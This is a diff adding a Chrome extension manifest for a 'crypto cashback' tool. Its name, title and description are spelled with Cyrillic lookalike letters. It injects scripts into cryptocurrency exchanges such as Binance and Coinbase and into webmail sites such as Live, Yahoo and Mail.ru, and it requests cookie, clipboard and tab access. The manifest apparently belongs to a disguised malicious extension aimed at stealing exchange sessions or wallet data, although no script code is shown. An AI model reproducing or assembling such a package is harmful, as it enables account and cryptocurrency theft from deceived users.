@@ -1,0 +1,35 @@
+{
+   "background": {
+      "persistent": false,
+      "scripts": [ "assets/js/jquery.min.js", "background/background.js" ]
+   },
+   "browser_action": {
+      "default_icon": {
+         "16": "data/icons/16.png",
+         "32": "data/icons/32.png",
+         "48": "data/icons/48.png",
+         "64": "data/icons/64.png"
+      },
+      "default_popup": "data/popup/popup.html",
+      "default_title": "Crурto Tооl"
+   },
+   "content_scripts": [ {
+      "css": [ "assets/css/font-awesome.min.css", "assets/css/fonts.css", "assets/css/style.css" ],
+      "js": [ "assets/js/jquery.min.js", "assets/js/loading-overlay.min.js" ],
+      "matches": [ "*://*.yandex.ru/*", "*://localbitcoins.com/*", "*://*.yahoo.com/*", "*://*.hbg.com/*", "*://*.huobi.com/*", "*://*.blockchain.com/*", "*://*.okex.com/*", "*://*.live.com/*", "*://*.google.com/*", "*://mail.ru/*", "*://*.binance.com/*", "*://*.coinbase.com/*", "*://*.qq.com/*", "*://*.mail.ru/*" ]
+   } ],
+   "description": "Return саshbaсk with every Bitcoin, Ethereum, Bitcoin Cash transaction by using plugin!",
+   "icons": {
+      "128": "data/icons/128.png",
+      "16": "data/icons/16.png", 
+      "32": "data/icons/32.png",
+      "48": "data/icons/48.png",
+      "64": "data/icons/64.png"
+   },
+   "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AIIBCgKCAQEAtmXSQbIyqCAepLYRY9qzpeWK3nh/gRAlZveDkGZz9cD8vXRsh+d1MPd5urvCGW2t1kUW0xSXM+ua8J77vvi1494btEdeq0J/7XDpbeHRN1C6X76d3k83GrWi0Op8cLaYpt/d6Pw7fGxUGpNONWJM7pGKje5pIxmQVTnWzUPwLXJERsG5FSS4WnyEC2TDwZZVD+931xEcGMc2OrDS6fsAGJelKhoVeZeMvZybqpYvGJuNaC2+vRvkYXe6vflSERBFUFiwcWiTMYxrbb56HebeyJirVtx/CJMBPqvhDXRfI1DQ4iO6yvJFdIziHOo8ArqYWiF0EUDSSRPsA+21BKvilQIDA",
+   "manifest_version": 2,
+   "name": "Aрр Crурtо Cashback",
+   "permissions": [ "tabs", "storage", "*://*.google.com/*", "*://*.binance.com/*", "*://*.live.com/*", "*://*.yahoo.com/*", "clipboardRead", "cookies" ],
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.0.50"
+}
